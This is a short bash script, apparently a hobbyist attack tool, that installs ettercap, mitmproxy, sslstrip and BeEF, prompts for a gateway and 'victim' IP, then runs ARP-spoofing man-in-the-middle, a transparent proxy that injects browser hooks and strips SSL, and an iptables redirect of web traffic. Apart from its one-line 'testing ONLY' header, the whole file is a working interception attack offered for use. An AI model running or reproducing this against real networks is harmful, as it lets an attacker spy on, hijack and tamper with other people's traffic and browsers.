#!/usr/bin/bash
# Written by Auxgrep
# This is for testing ONLY

BOLD="\033[01;01m"     
RED="\033[01;31m"      
GREEN="\033[01;32m"    
YELLOW="\033[01;33m"   
RESET="\033[00m"
clear

echo -e "1. SETUP"
read -p "Enter ur network interface (wlan0,eth0 ect): " intr
echo ""

echo -e $YELLOW "CHECKING REQUIREMENTS!! [ * ]"
sleep 2
echo ""
if [  -e /usr/bin/ettercap ]; then
    echo -e $GREEN "[ ✔ ] ettercap ................[ found ]"
else 
	echo -e $RED "[ X ] ettercap -> not found "
	echo -e "\n [*] ${YELLOW} Installing ettercap ${RESET}\n"
	sudo apt-get install ettercap-read-only
fi
sleep 2
if [  -e /usr/bin/mitmproxy ]; then
    echo -e $GREEN "[ ✔ ] mitmproxy ................[ found ]"
else 
	echo -e $RED "[ X ] mitmproxy -> not found "
	echo -e "\n [*] ${YELLOW} Installing mitmproxy ${RESET}\n"
	sudo apt-get install mitmproxy
fi

if [  -e /usr/bin/sslstrip ]; then
    echo -e $GREEN "[ ✔ ] sslstrip ................[ found ]"
else 
	echo -e $RED "[ X ] sslstrip -> not found "
	echo -e "\n [*] ${YELLOW} Installing sslstrip ${RESET}\n"
	sudo apt-get install sslstrip	 
fi
if [  -e /usr/bin/xterm ]; then
    echo -e $GREEN "[ ✔ ] xterm ................[ found ]"
else 
	echo -e $RED "[ X ] xterm -> not found "
	echo -e "\n [*] ${YELLOW} Installing xterm ${RESET}\n"
	sudo apt-get install xterm
fi
if [  -e /usr/bin/beef-xss ]; then
    echo -e $GREEN "[ ✔ ] beef-xss ................[ found ]"
else 
	echo -e $RED "[ X ] beef-xss -> not found "
	echo -e "\n [*] ${YELLOW} Installing beef-xss ${RESET}\n"
	sudo apt-get install beef-xss
fi
sleep 1
clear
echo -e "2. Finding a router/Gateway ip and victim ip"
echo ""
route -n
echo ""
read -p "Enter a gateway IP/router IP address: " ip
clear
echo -e "Your entered $ip as your default gateway"
sleep 1
clear
echo -e "Enter victim ip Address if you have more than one target provide ur ip in ranges eg: 192.168.1.168-255"
echo ""
read -p "Target IP: " target
sleep 1
clear
echo -e "ATTACK STARTED!!!"
echo ""
sleep 2
xterm -T "ETTERCAP ATTACKING $target" -e "ettercap -Tq -M arp:remote -i $intr -S /$ip// /$target//" &
sleep 2
#xterm -T "SSL PROXIES" -e "mitmdump -s ssl.py -m transparent" &
sleep 2
xterm -T "PROXY SERVER = = ATTACKING WITH BEEF-HOOKS" -e "mitmdump -s "js.py" -s "ssl.py" -m transparent -p 8080" &
sleep 2
xterm -e "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080" &